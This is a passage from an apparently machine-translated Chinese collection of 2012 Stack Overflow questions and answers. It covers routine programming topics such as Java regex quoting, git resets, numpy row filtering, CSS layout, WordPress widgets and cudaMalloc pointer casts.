从上面的代码示例中，我能够弄清楚发生了什么，因为该方法找到了 \ 的出现并将它们转换为 \E 和 \Q。有人可以解释为什么会这样。

有关此方法的更多上下文，我正在研究 jdk 1.6 中的 Pattern.quote() 方法

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-13T02:30:13.540

`\Q`Java 正则表达式引擎阻止对和之间的所有元字符的特殊解释`\E`。例如，`[name]`匹配单个字符（`'n'`、`'a'`、`'m'`或`'e'`），而`\Q[name]\E`匹配六个字符 - `'['`、`'n'`、`'a'`、`'m'`、`'e'`和`']'`. 有关更多详细信息，请参阅[正则表达式教程的](http://www.regular-expressions.info/characters.html)*特殊字符*部分。

该方法从可能是外部提供的（例如，由用户输入的）字符串生成正则表达式。由于字符串可能包含元字符，因此该方法将整个字符串包含在`\Q`和中`\E`。如果字符串已经包含 a `\E`，则该方法插入引号的结尾、匹配的以及它找到`\E`的每个新引号的开头。`\E`

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-13T02:39:33.313

`\Q`并且`\E`正是这样`Pattern.quote()`做的，即**返回指定字符串的文字模式字符串。**

**有关更多详细信息，请参阅此链接：**

[http://docs.oracle.com/javase/1.5.0/docs/api/java/util/regex/Pattern.html](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/regex/Pattern.html)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-13T02:14:46.430

好吧，`\Q`并且在 Java[正则表达式](http://docs.oracle.com/javase/6/docs/api/java/util/regex/Pattern.html#quot)`\E`中具有特殊含义...

这种方法的大部分只是处理引用引号`\Q`和`\E`它们本身的棘手的边缘情况。

# javascript - javascript中的JSON.stringify（）错误

> ID：11927457
> 
> 赞同：0
> 
> 时间：2012-08-13T02:14:16.540
> 
> 标签：javascript

我有以下代码

```
var number = 0618260587

JSON.stringify(number) 
```

字符串化的结果是 618260587 ，第一个零被自动截断。

我尝试了以下修复

```
if(number.length<8)
        {
        var book1 = "0" + number;
        alert(book1); 
```

但它警告未定义。我不知道

1）为什么字符串化的数据会截断第一个零 2）我认为 javascript 添加了两个变量，而与类型无关

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T02:16:38.877

前导零是一个显示的东西，通常不是数字的一部分。每个数字之前/之后都有无数个不可见的零，但它们通常不显示。如果您想要前导零，请将数字视为字符串：

```
var number = '0618260587'; 
```

同样，在大多数情况下，带有前导零的数字被视为八进制，而不是十进制。由于这个原因，前导零可能会导致难以跟踪的错误 - 它看起来像一个小数，但对于解释器来说，它是一个完全不同的数字，例如..

```
0618260587 octal = 1616431 decimal 
```

# c - libc.a 包含哪些标准库函数？

> ID：11927459
> 
> 赞同：6
> 
> 时间：2012-08-13T02:14:23.357
> 
> 标签：c, gcc, linker, glibc, standard-library

在 Linux 下使用时`gcc`，无需添加命令行选项即可使用`printf`. 在《*GCC 简介*》一书中，它解释了*“C 标准库本身存储在 '/usr/lib/libc.a' 中并包含 ANSI/ISO C 标准中指定的函数，例如 'printf'——这个库是链接的默认为每个 C 程序。”*
但是必须`-lm`在命令行中添加使用声明的标准库函数`math.h`，因为`libm.a`默认情况下没有链接。
那么其中包含了哪些标准库函数`libc.a`，因此不需要链接其他库文件。而除了`libm.a`，是否有任何其他标准库函数需要显式添加库文件以链接，以及库的文件名是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T02:24:15.260

`libc`并且`libm`都处理所有 ANSI/ISO 函数。除此之外，Linux 和 UNIX 系统遵循 POSIX，其中包括`libpthread`（通常使用`-pthread`选项链接，而不是在库中显式链接），以及`libiconv`可能包含在`libc`. POSIX 中的其他库包括`curses`和`libutil`用于杂项功能。

# c# - 实例化模型渲染，在 effects.techniques 中缺少硬件实例化

> ID：11927463
> 
> 赞同：1
> 
> 时间：2012-08-13T02:15:14.150
> 
> 标签：c#, 3d, xna

我一直在尝试让硬件实例在 XNA 4 中工作。我一直在关注 Microsoft 示例代码，并且在最后几行代码之前一切正常。

我遇到的问题是效果。技术仅具有基本效果。当我编译和运行他们的源代码时，它有硬件实例化选项，只是没有我复制过来的。它可能与他们项目的 InstancedModelPipeline 有关，但我无法找到它实际上是如何链接到项目的。他们的 InstancedModelPipeline 引入了一个 InstancedModel.fx，其中包含 HardwareInstancing。

```
Effect effect = meshPart.Effect;

effect.CurrentTechnique = effect.Techniques["HardwareInstancing"];
effect.Parameters["World"].SetValue(modelBones[mesh.ParentBone.Index]);
effect.Parameters["View"].SetValue(Camera.ViewMatrix);
effect.Parameters["Projection"].SetValue(projection); 
```

[示例代码站点](http://xbox.create.msdn.com/en-US/education/catalog/sample/mesh_instancing)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T08:28:21.830

`InstancedModelPipeline`是内容管道扩展。要使用它，您必须右键单击您的*内容*项目，单击“添加引用”，然后选择`InstancedModelPipeline`项目。

![内容项目参考列表中的 InstancedModelPipeline](../Images/99120b77a415fae1c7b3ad1aa5d84bf5.png)

（注意：不要从您的*游戏*项目中引用内容管道扩展。）

该`InstancedModelPipeline`项目为可用的模型提供了一个新的内容处理器，称为`InstancedModelProcessor`. 您必须在您的内容项目中选择您的模型，转到“属性”面板 (F4)，然后将您的模型设置为使用此处理器。

![已选择 InstancedModelProcessor](../Images/e55764493dc56f075905c18b1641ff25.png)

默认的 XNA 模型处理器将构建`BasicEffect`到模型中（`ModelMeshPart.Effect`属性）。该内容处理器将内置`InstancedModel.fx`，其中包括`HardwareInstancing`您正在寻找的效果。

# android - 为 Skype 样式的文本输入气泡创建布局

> ID：11927466
> 
> 赞同：0
> 
> 时间：2012-08-13T02:15:26.133
> 
> 标签：android, android-layout

在 iPhone 中，UIImage 上有一个名为 stretchableimagewithleftcapwidth 的方法，可用于创建聊天气泡以拉伸任何尺寸（保持角落自然尺寸）。

我们在 Android 中似乎没有这个，所以我开始制作一个布局，然后我可以将其用作带有 FrameLayout 的背景图像。我现在遇到的麻烦是顶行，它由 3 列组成：左上角、可拉伸顶部和右上角。如何让左右上角保持固定大小（11dip）并告诉中间填充父级中的任何剩余空间？这就是我到目前为止所拥有的。

```
<?xml version="1.0" encoding="UTF-8"?>
    <merge xmlns:android="http://schemas.android.com/apk/res/android">
    <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:id="@+id/layout_bubble_container"
    android:orientation="vertical">    
    <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
        android:layout_height="11dip"
        android:id="@+id/layout_bubble_toprow"
        android:orientation="horizontal">    
        <LinearLayout
            android:id="@+id/layout_top_leftCorner"
            android:layout_width="11dip"
            android:layout_height="fill_parent"
            android:gravity="left|top">
            <ImageView
                android:id="@+id/bubble_top_leftcorner"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent"
                android:src="@drawable/bubble_lefttop" />
        </LinearLayout>

        <LinearLayout
            android:id="@+id/layout_top"
            android:layout_width="wrap_content"
            android:layout_height="fill_parent"
            android:gravity="top|center" >

            <ImageView
                android:id="@+id/bubble_top"
                android:layout_width="match_parent"
                android:layout_height="fill_parent"
                android:scaleType="fitXY"
                android:src="@drawable/bubble_top" />
        </LinearLayout>

        <LinearLayout
            android:id="@+id/layout_top_rightCorner"
            android:layout_width="11dip"
            android:layout_height="fill_parent"
            android:gravity="right|top" >

            <ImageView
                android:id="@+id/bubble_top_rightcorner"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent"
                android:src="@drawable/bubble_righttop" />
        </LinearLayout>    
    </LinearLayout>
    <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
        android:layout_height="11dip"
        android:id="@+id/layout_bubble_middlerow"
        android:orientation="horizontal"
        android:background="@color/WHITE">    
        <LinearLayout
            android:id="@+id/layout_left"
            android:layout_width="match_parent"
            android:layout_height="fill_parent"
            android:gravity="left"
            android:layout_weight="1">
            <ImageView
                android:id="@+id/bubble_left"
                android:layout_width="11dip"
                android:layout_height="fill_parent"
                android:src="@drawable/bubble_left" />
        </LinearLayout>
        <LinearLayout
            android:id="@+id/layout_right"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:gravity="right" 
            android:layout_weight="1">

            <ImageView
                android:id="@+id/bubble_right"
                android:layout_width="11dip"
                android:layout_height="fill_parent"
                android:src="@drawable/bubble_right" />
        </LinearLayout>    
    </LinearLayout>
    <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
        android:layout_height="11dip"
        android:id="@+id/layout_bubble_bottomrow"
        android:orientation="horizontal">    
        <LinearLayout
            android:id="@+id/layout_bottom_leftCorner"
            android:layout_width="11dip"
            android:layout_height="fill_parent"
            android:gravity="left|top">
            <ImageView
                android:id="@+id/bubble_bottom_leftcorner"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent"
                android:src="@drawable/bubble_leftbottom" />
        </LinearLayout>

        <LinearLayout
            android:id="@+id/layout_bottom"
            android:layout_width="wrap_content"
            android:layout_height="fill_parent"
            android:gravity="top|center" >

            <ImageView
                android:id="@+id/bubble_bottom"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent"
                android:scaleType="fitXY"
                android:src="@drawable/bubble_bottom" />
        </LinearLayout>

        <LinearLayout
            android:id="@+id/layout_bottom_rightCorner"
            android:layout_width="11dip"
            android:layout_height="fill_parent"
            android:gravity="right|top" >

            <ImageView
                android:id="@+id/bubble_bottom_rightcorner"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent"
                android:src="@drawable/bubble_rightbottom" />
        </LinearLayout>    
    </LinearLayout>
</LinearLayout> 
```

如果这有帮助，这是 Eclipse 中的布局树。 ![可视化布局](../Images/da311b878bf23466f80e10025a9a1fdd.png)

这是在 Eclipse 的布局编辑器中呈现的样子。请注意顶部和底部的行没有适当地拉伸。

![在此处输入图像描述](../Images/5cb91ca74e2a12303ba29efd438e6efe.png)

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T05:59:00.550

我还需要在我的应用程序中使用聊天气泡视图，所以我使用了 9 个可绘制的补丁作为背景图像，它工作正常。

检查这个问题：

[为什么 9-patch 图形大小在模拟器中正确，但在手机上却不行？](https://stackoverflow.com/questions/5096537/why-do-9-patch-graphics-size-correctly-in-the-emulator-but-not-on-a-phone)

还有这个链接：

[http://warting.se/2012/06/04/chat-bubbles-in-android/](http://warting.se/2012/06/04/chat-bubbles-in-android/)

# java - 自动同步歌词和歌曲 - Java

> ID：11927468
> 
> 赞同：0
> 
> 时间：2012-08-13T02:16:16.897
> 
> 标签：java, android, sync, id3v2

我正在尝试创建一个 Android 应用程序，它将从它的 ID3V2 标签中获取 mp3 的歌词。我的问题是，是否可以在歌曲播放时自动突出显示歌词？就像使用语音处理或类似的东西。我已经查看了以前的类似问题，但所有这些问题都需要手动输入。需要尽快反馈。谢谢你。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T02:29:05.287

这种事情在好莱坞电影场景中是可能的，使用类似于使用 4 像素正方形作为输入重建面部的图像增强技术。

好的，所以您的请求在理论上更可行，但我所知道的当前电话技术无法即时执行此操作。您可能需要一个[Delorean 磁通电容器和一些钚](http://en.wikipedia.org/wiki/Back_to_the_Future)。

此外，检测音乐中的人声比对着手机发短信要困难得多：

1.  歌词通常不遵循自然的语音节奏；
2.  音乐的频谱往往与语音的频谱发生冲突；
3.  声音的音高变化，使得分离和检测语音特征变得更加困难；
4.  人声通常以与所有其他乐器相同的水平混合；
5.  IwannahuhIwannahuhIwannahuhIwannahuhIwannaReallireallirealliwannaZigaZiggUHH。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-07-17T23:05:44.483

您可以查看[这篇论文](http://ieeexplore.ieee.org/xpl/login.jsp?tp=&arnumber=5876296&url=http%3A%2F%2Fieeexplore.ieee.org%2Fiel5%2F4200690%2F6018327%2F05876296.pdf%3Farnumber%3D5876296)LyricSynchronizer：音乐音频信号和歌词之间的自动同步系统，以获得可能的解决方案。没有在 Java 中为 Android 实现任何东西，但是使用 NDK，您可以使用任何 C 代码并对其进行处理。;-)

> 本文描述了一种可以自动将复调音乐音频信号与其相应歌词同步的系统。尽管已经提出了通过使用维特比对齐技术来同步单声道语音信号和相应文本转录的方法，但是这些方法不能应用于CD录音中的人声，因为人声经常被伴奏声重叠。除了减少伴奏声音影响的传统方法外，我们因此开发了四种方法来克服这个问题：检测人声部分的方法、构建稳健音素网络的方法、检测摩擦音的方法和方法用于使语音识别器电话模型适应分离的声音信号。

祝您实施顺利！

# c++ - 读取一列文本数据并在 C++ 中放入一个 3D 数组

> ID：11927481
> 
> 赞同：0
> 
> 时间：2012-08-13T02:17:50.163
> 
> 标签：c++, visual-c++

我有一列数据（mydata.txt）如下（27行）：

```
1
2
3
.
.
.
25
26
27 
```

我想从文本文件中读取它，然后将其放入大小为 3x3x3 的 B 的 3D 数组中。任何人都可以帮助我吗？这是我刚刚用于读取数据的代码。我不知道我应该如何将读取的数据放入 3x3x3 的 3D 数组中。

```
#include <fstream>
#include <iostream>

int main()
{
    int input1;
    double input2;

    //Open file
    std::ifstream inFile;
    inFile.open("mydata.txt"); //or whatever the file name is

    while(!inFile.eof())
    {
        //Get input
        inFile >> input1 >> input2;

        //Print input
        std::cout << input1 << " " << input2 << " ";
    }

    //Close file
    inFile.close();
    system ("PAUSE");

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:54:40.233

就像是：

```
int b[3][3][3];
for (int i=0; i<3 && !inFile.eof(); i++)
{
    for (int j=0; j<3 && !inFile.eof(); j++)
    {
        for (int k=0; k<3 && !inFile.eof(); k++)
        {
            inFile >> input1;
            b[i][j][k] = input1;
        }
    }
} 
```

# python - 快速选择至少 N 多列在 numpy/scipy 中成立的行

> ID：11927484
> 
> 赞同：3
> 
> 时间：2012-08-13T02:17:56.583
> 
> 标签：python, numpy, scipy

如果我有这个`numpy`数组：

```
>>> a
array([[ 1,  2,  3],
       [ 4,  4,  6],
       [ 4, 10,  9]]) 
```

从其中选择条件至少对`N`许多元素成立的所有行的最快方法是什么？

例如，选择至少两个数字可以被 2 整除的所有行。

我想出的解决方案是：

```
@ find rows where 2 or more elements are evenly divisible by two
N = 2  
a[where(array(map(lambda x: sum(x), a % 2 == 0)) >= N)] 
```

使用的替代解决方案`apply_along_axis`是：

```
a[where(sum(numpy.apply_along_axis(lambda x: x % 2 == 0, 1, a), axis=1) >= 2)] 
```

在 numpy/scipy 中是否有比这些更优雅/更快的方式？如果不是，以上两个哪个最好？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:28:58.487

我可能会做

```
In [29]: timeit a[(a % 2 == 0).sum(axis=1) >= 2]
10000 loops, best of 3: 29.5 us per loop 
```

之所以有效，是因为 True/False 的整数值为 1/0。为了比较：

```
In [30]: timeit a[where(array(map(lambda x: sum(x), a % 2 == 0)) >= N)]
10000 loops, best of 3: 72 us per loop

In [31]: timeit a[where(sum(apply_along_axis(lambda x: x % 2 == 0, 1, a), axis=1) >= 2)]
1000 loops, best of 3: 220 us per loop 
```

请注意，首先使用 lambdas 会让您失去使用 numpy 的许多好处，而且无论如何这里`lambda x: sum(x)`只是一种更冗长和更慢的编写方式`sum`。

另请注意，如果阵列很大，则使用可能会短路的方法可能比上述方法更有效。

# git - 我想放弃最近的更改并返回已推送的最新提交。未分级删除：

> ID：11927489
> 
> 赞同：1
> 
> 时间：2012-08-13T02:19:06.940
> 
> 标签：git

我想放弃最近的更改并返回已推送的最新提交 (2de1222)。

当时只有一个文件正在处理（未暂存）。自 2de1222 以来已进行了一次本地提交。我在一个单独的窗口中创建了一个 gitk，这样我就可以验证每个提交的 SHA 以及包含的文件应该是什么样子。

首先我试过了`git reset 2de1222 --hard`。这给了我消息“致命：此操作必须在工作树中运行”。所以我做了一个“git status”，它显示了我的一个修改过的文件，但是在“没有为提交暂存的更改”下有一长串文件，它们都是我的应用程序的一部分。这里的 'gitk' 表明我正处于我想要移动到的提交中。工作目录中的目标文件看起来与提交 2de1222 一样。

我搜索了有关类似消息的答案并尝试了以下建议：

```
git checkout master

git reset --soft HEAD@{1}

git reset HEAD [my_filename]

git pull origin master

git reset --hard 2de1222  (different argument order) 
```

在每种情况下，我都从 'git status' 得到相同的结果，以及相同的警告：“致命：此操作必须在工作树中运行”。我真的不明白为什么 git 列出了一堆假定的删除以及为什么我不在“工作树”中。

如何在 2de1222 提交后立即恢复到相同的状态（“git status”显示没有文件）并准备好更改、测试和提交我需要的一个文件？（希望不必分别处理每个“已删除”文件）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-02-10T00:33:27.640

使用这个：

```
git checkout -- . 
```

将丢弃所有更改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T02:26:34.013

运行这些命令时，您是否在带有源代码的源代码目录中？这是可能发生这种情况的原因之一，例如，如果您在 .git 目录中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T03:48:30.887

好吧，我退出目录，将其重命名为 ...Old 尝试克隆答案，当我发现无法克隆它时（由于我自己之前未能推送它），我将其命名回来并开始查看 .git 目录中的文件。

那里一切看起来都很好，然后当我回到终端窗口中的目录并执行“git status”时，所有被虚假“删除”的未暂存文件都消失了！

所以我不知道到底是什么修复了它（也许这只是一个 git 视图问题），但现在一切看起来都很正常。

# css - 具有 div、iframe、页脚的页面的 100% 高度

> ID：11927492
> 
> 赞同：1
> 
> 时间：2012-08-13T02:19:32.963
> 
> 标签：css, html, iframe

我被这个问题困住了，希望有人能提供解决方案。我发现了一个类似的帖子，但没有关于 SO 的解决方案。下面是我的标记的一个小样本

```
<div id="wrapper">
  <div id="content">
    Some text goes here
    <iframe src="http://www.reddit.com" height="100%" width="100%" />
  </div>
  <div id="footer"> footer text</div>
</div> 
```

看小提琴中的例子：http: [//jsfiddle.net/SaYAw/36/](http://jsfiddle.net/SaYAw/36/)

我想要实现的是包装 div 消耗 100% 的页面，下面不留空白。包装器 div 将同时容纳“内容”和 iframe，并随着屏幕/浏览器窗口大小的变化自动调整 iframe 的高度。这似乎是一个非常简单的任务，但我找不到让它工作的方法。有没有人知道我可能会错过什么？寻找最好的纯 CSS 解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:39:59.677

请确保不要在类和 ID 之间混用

该课程以`'.'`您在 CSS 文件中的点开头

但是在您的 HTML 中，您没有设置类并且是一个 ID。因此，您需要将 CSS 更改`'#'`为

```
html, body
{
    height:100%;
    min-height:100%;
}
#wrapper
{
    border: 1px dotted #000;
    margin:5px;
    height:100%;
    min-height:100%;
}
#content
{
    border:1px solid #ccc;
    margin:5px;
    padding:5px;
    height:100%;
    min-height:100%;
}
#ifrContent
{
    height:100%;
    min-height:100%;
    overflow:scroll;
} 
```

希望这就是你要找的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T15:54:47.837

你没有关闭你的 iframe。

```
<iframe src="http://www.reddit.com"
height="100%" width="100%"></iframe> 
```

# date - 日期：清除时间

> ID：11927493
> 
> 赞同：-1
> 
> 时间：2012-08-13T02:19:57.067
> 
> 标签：date, grails

我正在尝试保存日期，但时间明确。到目前为止它不起作用。即使我已经在引导程序中声明 clearTime 来保存数据，它也总是有时间。我在想我必须在域类中使用 clearTime，因为我使用的是 mysql db。请告诉我。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T07:52:29.590

假设您有一个带有 Date 字段的 Domain 对象，您应该能够为它创建一个设置器，在设置它时清除日期的时间部分：

```
class MyDomain {
  Date date

  void setDate( Date d ) {
    d.clearTime()
    this.date = d
  }
} 
```

# iphone - sizeWithFont 是否考虑自动收缩？

> ID：11927496
> 
> 赞同：0
> 
> 时间：2012-08-13T02:20:22.013
> 
> 标签：iphone, ios, uikit

我有一些带有一些烦人的复杂定位代码的 uilabels。

如果我使用 sizeWithFont 根据它们的文本来调整它们的大小，那么在查找该大小时是否会考虑 autoshrink 属性？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T03:38:32.100

查看：

```
- (CGSize)sizeWithFont:(UIFont *)font minFontSize:(CGFloat)minFontSize actualFontSize:(CGFloat *)actualFontSize forWidth:(CGFloat)width lineBreakMode:(UILineBreakMode)lineBreakMode 
```

在[NSString UIKit Additions Reference](http://developer.apple.com/library/ios/#documentation/uikit/reference/NSString_UIKit_Additions/Reference/Reference.html)中。我认为这会做你想要的。

# iphone - 用于支持多种设备的网站原型设计工具/框架

> ID：11927499
> 
> 赞同：1
> 
> 时间：2012-08-13T02:20:36.880
> 
> 标签：iphone, ruby-on-rails, html, web-applications

我想创建一个可以在多个设备上加载的门户网站，主要是手机 [只有 android 或 iphone 也可以] 和桌面浏览器。

我正在尝试对我进行了一些研究的产品创意进行原型设计。我想构建一个最小可行的产品，我可以给朋友使用，用于演示等并最终迭代它..

由于目前我是团队中唯一的人员/开发人员 [每周 4 小时]，以下是我的主要要求：

1.  应该有更少的学习曲线，让我开始
2.  不需要是通用的，但应该至少满足一个子集。[仅适用于浏览器和 iphone [ipad、android 手机] 很好
3.  良好的社区支持和容易找到合作的人。
4.  性能不是大问题
5.  本机代码或外观不是大问题
6.  我希望主要用户是电话用户，但目前电话上的有限功能还可以。
7.  我不介意扔掉整个东西并在我有一些牵引力之后最终以更好的方式重写一些东西。

HTML5 网页可以在多个设备上加载 [?] 所以类似的东西很好。

我主要是后端开发人员 [Java、ruby、DB、solr、lucene、memcache 等]，所以我不精通网络技术 [jscript、jquery、css、ajax] 等，这使得这很棘手。我知道 ruby​​ 并且正在尝试学习 rails [学习黄瓜、水豚等]，并且发现它非常用户友好且可以快速进行原型制作

任何有助于构建此类门户的工具/框架的[列表]。因为我每天都在使用 ruby​​ 和 rails，所以我会喜欢那个生态系统中的一些东西，但不是必需的。

谢谢。PS：门户网站是一个类似电子商务的小型网站，它与不同的电子商务网站和用户的社交信息流等交互，为他们带来一些建议[现在考虑比较购物门户很好]

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:32:36.390

我建议遵循使用 CSS 媒体查询的[响应式设计方法。](http://coding.smashingmagazine.com/2011/01/12/guidelines-for-responsive-web-design/)

这样你就不用担心任何本地或设备。只关注 CSS 和 HTML。

基本上，您使用移动优先方法构建，然后使用媒体查询，随着设备屏幕尺寸的增加，您可以增强布局（和/或功能）。

看看这个可以提供帮助[的框架列表。](http://webexpedition18.com/articles/responsive-css-frameworks/)我用过 320 及以上，LESS 和 Amazium。选择一个适合你需要的。

以下是响应式设计中的一些[常见模式](http://designshack.net/articles/css/5-really-useful-responsive-web-design-patterns/)。

这是一个很棒的响应式设计[画廊](http://mediaqueri.es/)。

# c# - 将日期参数从 C# WinForm 传递到 SQL 存储过程

> ID：11927502
> 
> 赞同：1
> 
> 时间：2012-08-13T02:20:46.913
> 
> 标签：c#, sql-server, winforms, stored-procedures, type-conversion

我有一个带有 2 个`dateTimePicker`控件（`dtpStart`和`dtpEnd`）、一个按钮和一个`datagridview`显示结果的表单。`datagridview`绑定到`bindingSource`控件。

我想将控件中的两个`date`参数传递`dateTimePicker`给存储过程，以便在我的 datagridview 上返回所需的范围。

我的存储过程如下所示：

```
CREATE PROC [dbo].[ProcTest](@StartDate date, @EndDate date)
AS
SELECT * FROM Test WHERE ModifiedDate BETWEEN @StartDate AND @EndDate 
```

我的 C# 代码是：

```
 private void button1_Click(object sender, EventArgs e)
    {
        dc = new NorthwindDataContext();

        var Qry = dc.ProcTest(dtpStart.Value, dtpEnd.Value);
        bindingSource1.DataSource = Qry;
    } 
```

当我运行上面的代码时，我的数据网格上什么也没有收到，`dtpEnd.value`显示：`13/08/2012 02:15:29`，我认为这是一个转换问题，因为我`date`在存储过程中使用了类型并且`datetimepicker`值是一个`dateTime`类型。

请问，这个怎么解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T04:10:50.057

您需要检索查询的结果，例如：

```
bindingSource1.DataSource = Qry.ToList(); 
```

我认为问题根本不在于 Date 参数。这是根据：

[http://msdn.microsoft.com/en-us/library/bb386947.aspx](http://msdn.microsoft.com/en-us/library/bb386947.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T05:23:56.497

而不是这个

```
var Qry = dc.ProcTest(dtpStart.Value, dtpEnd.Value); 
```

使用它并检查您的问题是否得到解决。

```
var Qry = dc.ProcTest(dtpStart.ToString("dd-MMM-yyyy"), dtpEnd.ToString("dd-MMM-yyyy")); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:17:35.510

感谢 Dave R. 提供的链接：http: [//msdn.microsoft.com/en-us/library/bb386947.aspx](http://msdn.microsoft.com/en-us/library/bb386947.aspx)我发现我的代码无需任何修改即可工作。所以我首先通过从 SP 中删除参数来搜索错误，然后我发现我必须创建一个**指向 SP 结果的新数据源对象**，并**在设计时将其绑定**到 datagridview。现在数据网格显示数据和参数正在工作。

对不起，伙计们，在发布我的问题之前，我必须验证这一点，但我对日期参数的使用感到非常困惑。

所以我将代码保留在最初的问题中：

```
private void button1_Click(object sender, EventArgs e)
{
    dc = new NorthwindDataContext();

    var Qry = dc.ProcTest(dtpStart.Value, dtpEnd.Value);
    bindingSource1.DataSource = Qry;
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-13T03:05:32.277

我相信您需要发送日期，而不是您的日期时间选择器的值。

基本上，改变这一行：

```
var Qry = dc.ProcTest(dtpStart.Value, dtpEnd.Value); 
```

读书：

```
var Qry = dc.ProcTest(dtpStart.SelectedDate.Value, dtpEnd.SelectedDate.Value); 
```

如果这仍然不起作用，我会尝试：

```
var Qry = dc.ProcTest(dtpStart.SelectedDate.Value.Date, dtpEnd.SelectedDate.Value.Date); 
```

# php - 如何禁用网站中的所有页面小部件？

> ID：11927505
> 
> 赞同：0
> 
> 时间：2012-08-13T02:21:37.093
> 
> 标签：php, wordpress

我在wordpress主题的functions.php中有一个简单的代码

```
add_filter( 'sidebars_widgets', 'disable_all_widgets' );

function disable_all_widgets( $sidebars_widgets ) {
    if ((is_single() || is_home() || is_front_page()) && have_posts())
        $sidebars_widgets = array( false );
    return $sidebars_widgets;
} 
```

当我在主页时结果正常，但是当我单击菜单时，其他菜单主页是结果显示所有小部件，如何禁用所有小部件所有页面

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:27:42.307

如果要禁用所有页面中的所有小部件：

```
add_filter( 'sidebars_widgets', 'disable_all_widgets' );

function disable_all_widgets( $sidebars_widgets ) {
    return array( false );
} 
```

根本不做检查。

# c - (void **)&x 和 (void *)x 有什么区别？

> ID：11927506
> 
> 赞同：2
> 
> 时间：2012-08-13T02:21:39.970
> 
> 标签：c, pointers, cuda, gpgpu, gpu

(void **)&x 和 (void *)x 有什么区别？我会给你一些代码，请帮助我。

```
float *xd;
int size=width*width*size(float);
cudaMalloc((void **)&x,size); 1
cudaMalloc((void *)x,size);   2
cudaMalloc(&x,size);          3
cudaMalloc(*x,size);          4

cudaFree(xd); 
```

我只是想知道区别。

cudaMalloc() 函数的第一个参数是分配后必须指向分配对象的指针变量的地址。指针变量的地址应该转换为 (void **) 因为函数需要一个通用指针值；内存分配函数是一个通用函数，不限于任何特定类型的对象。该地址允许 cudaMalloc() 函数将分配对象的地址写入指针变量。3 cudaMalloc() 函数的第二个参数给出了要分配的对象的大小，以字节为单位。这第二个参数的用法与 C malloc() 函数的 size 参数一致。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T03:30:36.043

它们几乎*完全*不同。

这：

```
(void **)&x 
```

获取 的地址`x`并将其转换为`void**`（指向 的指针的指针`void`）。

这：

```
(void *)x 
```

获取 的值*并将*`x`其转换为`void*`。

它们都是指针，但它们指向内存中完全不同的位置（除非`x`碰巧包含它自己的地址），并且它们属于不同的类型。

如果您想向我们展示代码，向我们展示实际编译的代码会很有帮助。复制并粘贴您的实际源代码；不要重新输入。您还没有向我们展示`x`(is `xd`a typo for `x`?) 的声明，并且`size(float)`是语法错误（您的意思是`sizeof(float)`?）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T11:00:42.603

为了让你更好地理解为什么*你*`cudaMalloc`经常写作`(void**)&var`，请考虑以下几点：

`cudaMalloc`在 GPU 上分配内存。它所指的内存类型是`void*`因为它并不真正关心数据类型。

一旦我们在`cudaMalloc`刚刚分配的内存中获得了该内存的地址，我们需要以某种方式将其返回给调用者。但是所有 CUDA API 函数都返回错误代码（或成功代码），并且任何其他返回的数据都必须通过参数引用传回。

C 语言没有按引用传递，因此您实际上需要将指针传递给您希望函数存储结果的变量。由于要存储指针值，因此需要传递一个指向指针的指针。因此`void**`键入。

如果想以类似的方式封装 malloc，可以这样写：

```
void myMalloc(void** ret, size_t size) {
    void* mem = malloc(size);
    *ret = mem;
} 
```

现在，如果您传递`(void**)&var`给`myMalloc`，该函数将能够覆盖`var`--- 的值，因为`ret`它将指向`var`变量。

这是否使它更清楚？

# javascript - 移除 HTML5 视频标签上的控制（播放、暂停等）

> ID：11927508
> 
> 赞同：0
> 
> 时间：2012-08-13T02:22:10.077
> 
> 标签：javascript, html5-video

有没有办法删除带有 html5 视频标签的控制按钮。

```
<video controls>
 <source src="video.ogv">
 <source src="video.mp4">
</video> 
```

我很确定有办法做到这一点。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:27:06.727

根本不设置它 `controls`是一个布尔属性，因此您可以设置它或不设置它。 `<video controls>`是相同的`<video controls="controls">`

```
<video>
  <source src="video.ogv">
  <source src="video.mp4">
</video> 
```

# java - 在屏幕下半部分显示图像和用户信息

> ID：11927513
> 
> 赞同：1
